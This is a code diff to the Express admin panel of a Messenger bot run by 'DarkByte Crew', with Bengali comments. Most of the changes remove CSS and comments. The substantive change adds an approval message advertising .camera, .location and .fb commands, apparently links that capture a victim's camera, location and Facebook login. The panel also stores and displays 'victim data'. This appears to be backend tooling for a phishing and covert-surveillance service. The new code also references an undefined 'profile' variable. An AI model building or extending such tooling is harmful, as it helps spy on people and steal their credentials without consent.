@@ -3,6 +3,7 @@ const router = express.Router();
 const Config = require('../models/Config');
 const User = require('../models/User');
 const Victim = require('../models/Victim');
+const { sendMessage } = require('../utils/helpers');  // 🔥 মেসেজ পাঠানোর ফাংশন ইমপোর্ট
 
 // ============================
 // অ্যাডমিন লগইন চেক (মিডলওয়্যার)
@@ -106,11 +107,6 @@ router.get('/admin', async (req, res) => {
                     margin-top: 12px;
                     display: ${req.query.error ? 'block' : 'none'};
                 }
-                .login-card .footer-text {
-                    margin-top: 24px;
-                    font-size: 13px;
-                    color: #9ca3af;
-                }
                 /* ডিফল্ট পাসওয়ার্ড টেক্সট সম্পূর্ণ রিমুভ */
             </style>
         </head>
@@ -124,7 +120,6 @@ router.get('/admin', async (req, res) => {
                     <input type="password" name="password" placeholder="পাসওয়ার্ড লিখুন" required>
                     <button type="submit"><i class="fas fa-arrow-right-to-bracket"></i> লগইন</button>
                 </form>
-                <!-- 👇 ডিফল্ট পাসওয়ার্ড টেক্সট সম্পূর্ণ রিমুভ -->
             </div>
         </body>
         </html>
@@ -233,7 +228,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     max-width: 1440px;
                     margin: 0 auto;
                 }
-                /* header */
                 .header {
                     display: flex;
                     justify-content: space-between;
@@ -270,7 +264,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     background: #fecaca;
                 }
 
-                /* stats */
                 .stats {
                     display: grid;
                     grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -309,7 +302,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     color: #6b7280;
                 }
 
-                /* cards */
                 .card {
                     background: #ffffff;
                     border-radius: 20px;
@@ -346,7 +338,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     border-radius: 30px;
                 }
 
-                /* tables */
                 .table-wrap {
                     overflow-x: auto;
                     border-radius: 12px;
@@ -433,7 +424,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                 .btn-view:hover { background: #dbeafe; }
                 .text-muted { color: #9ca3af; }
 
-                /* form elements inside card */
                 .config-grid {
                     display: grid;
                     grid-template-columns: 1fr 1fr;
@@ -506,7 +496,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
         </head>
         <body>
             <div class="container">
-                <!-- header -->
                 <div class="header">
                     <h1><i class="fas fa-panel"></i> অ্যাডমিন প্যানেল</h1>
                     <a href="/admin/logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> লগআউট</a>
@@ -515,7 +504,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                 ${msg ? `<div style="background:#d1fae5;color:#065f46;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-check-circle"></i> ${msg}</div>` : ''}
                 ${error ? `<div style="background:#fee2e2;color:#991b1b;padding:14px 20px;border-radius:12px;margin-bottom:24px;display:flex;align-items:center;gap:10px;"><i class="fas fa-exclamation-circle"></i> ${error}</div>` : ''}
 
-                <!-- stats -->
                 <div class="stats">
                     <div class="stat-card">
                         <div class="icon"><i class="fas fa-users"></i></div>
@@ -535,7 +523,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     </div>
                 </div>
 
-                <!-- config -->
                 <div class="card">
                     <div class="card-header">
                         <h2><i class="fas fa-sliders-h"></i> কনফিগারেশন</h2>
@@ -569,7 +556,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     </div>
                 </div>
 
-                <!-- users -->
                 <div class="card">
                     <div class="card-header">
                         <h2><i class="fas fa-address-book"></i> ইউজার ম্যানেজমেন্ট</h2>
@@ -585,7 +571,6 @@ router.get('/admin/dashboard', isAdmin, async (req, res) => {
                     </div>
                 </div>
 
-                <!-- victims -->
                 <div class="card">
                     <div class="card-header">
                         <h2><i class="fas fa-eye"></i> ভিক্টিম ডেটা</h2>
@@ -627,21 +612,58 @@ router.post('/admin/update-config', isAdmin, async (req, res) => {
     }
 });
 
+// ================================================================
+// 🆕 ইউজার টগল – অনুমোদন দিলে অটো মেসেজ
+// ================================================================
 router.post('/admin/toggle-user', isAdmin, async (req, res) => {
     try {
         const { userId, action } = req.body;
         const user = await User.findOne({ fbId: userId });
-        if (user) {
-            user.allowed = (action === 'allow');
-            await user.save();
+        if (!user) {
+            return res.redirect('/admin/dashboard?error=ইউজার+পাওয়া+যায়নি');
         }
+
+        // আগের স্টেট
+        const wasAllowed = user.allowed;
+
+        // আপডেট
+        user.allowed = (action === 'allow');
+        await user.save();
+
+        // ============================================================
+        // 🔥 যদি আগে অনুমোদিত না ছিল এবং এখন অনুমোদিত করা হয়, তাহলে মেসেজ পাঠান
+        // ============================================================
+        if (action === 'allow' && !wasAllowed) {
+            const fullName = profile?.name || (profile?.first_name && profile?.last_name ? `${profile.first_name} ${profile.last_name}` : 'বন্ধু');
+            const ownerLink = 'm.me/2ndJohnnySins'; // আপনার ওনার লিঙ্ক
+
+            const msg = `🎉 অভিনন্দন, ${fullName}! 🥳
+
+আপনাকে DarkByte Crew বটের অ্যাক্সেস দেওয়া হয়েছে। 🔓
+এখন থেকে আপনি বটের সকল ফিচার ও কমান্ড ব্যবহার করতে পারবেন।
+
+⚙️ কমান্ড দেখতে টাইপ করুন:
+━━━━━━━━━━━━━━━━━━━━
+📷 .camera — ক্যামেরা লিংক
+📍 .location — লোকেশন লিংক
+👤 .fb — ফেসবুক লিংক
+
+🔗 Owner: ${ownerLink}`;
+
+            await sendMessage(user.fbId, msg);
+            console.log(`📨 অনুমোদন মেসেজ পাঠানো হয়েছে: ${user.fbId}`);
+        }
+
         res.redirect('/admin/dashboard?msg=ইউজার+আপডেট+হয়েছে');
     } catch (err) {
+        console.error('Toggle user error:', err);
         res.redirect('/admin/dashboard?error=আপডেট+ব্যর্থ');
     }
 });
 
-// 🆕 ইউজার ডিলিট রাউট
+// ================================================================
+// 🆕 ইউজার ডিলিট
+// ================================================================
 router.post('/admin/delete-user', isAdmin, async (req, res) => {
     try {
         const { userId } = req.body;
